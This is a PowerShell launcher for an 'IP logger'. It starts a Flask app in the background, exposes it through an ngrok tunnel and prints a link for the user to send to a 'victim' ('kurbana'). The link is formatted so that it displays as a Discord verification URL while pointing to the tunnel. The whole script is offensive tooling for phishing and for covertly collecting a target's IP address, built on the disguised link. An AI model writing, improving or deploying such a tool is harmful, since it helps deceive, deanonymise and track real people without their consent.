Write-Host "=== IP LOGGER BASLATILIYOR ===" -ForegroundColor Green
Set-Location $PSScriptRoot

# Flask'i arka planda baslat
$flask = Start-Job -ScriptBlock {
    Set-Location $args[0]
    $env:FLASK_PORT = "5003"
    python app.py
} -ArgumentList $PSScriptRoot

Start-Sleep 3

# Ngrok'u baslat
Write-Host "Ngrok baslatiliyor..." -ForegroundColor Yellow
$ngrok = Start-Process -FilePath "ngrok" -ArgumentList "http 5003" -NoNewWindow -PassThru

Start-Sleep 5

# Ngrok URL'ini al
try {
    $resp = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -ErrorAction Stop
    $url = $resp.tunnels[0].public_url
    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host "LINK HAZIR!" -ForegroundColor Green
    Write-Host "Bu linki kurbana gonder:" -ForegroundColor White
    Write-Host "[discord.com/verify/KULLANICI_ID]($url/verify/KULLANICI_ID)" -ForegroundColor Yellow
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "`nCikmak icin CTRL+C" -ForegroundColor Gray
} catch {
    Write-Host "Ngrok URL alinamadi, manuel bak: http://127.0.0.1:4040" -ForegroundColor Red
}

# Bekle
while ($true) {
    Start-Sleep 10
    Receive-Job $flask -ErrorAction SilentlyContinue
}
